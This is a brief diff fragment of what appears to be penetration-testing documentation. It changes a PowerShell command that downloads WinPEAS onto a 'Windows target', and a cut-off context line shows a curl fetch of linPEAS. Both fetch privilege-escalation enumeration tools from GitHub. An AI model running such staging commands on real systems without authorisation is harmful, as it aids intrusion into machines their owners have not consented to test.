@@ -62,7 +62,7 @@ curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.s
 
 **For Windows Targets (WinPEAS Live PowerShell Memory Stager):**
 ```powershell
-pwsh -Command "Invoke-WebRequest -Uri 'https://github.com' -OutFile 'winpeas.exe'"
+pwsh -Command "Invoke-WebRequest -Uri 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe' -OutFile 'winpeas.exe'"
 ```
 
 ## Generated Payload
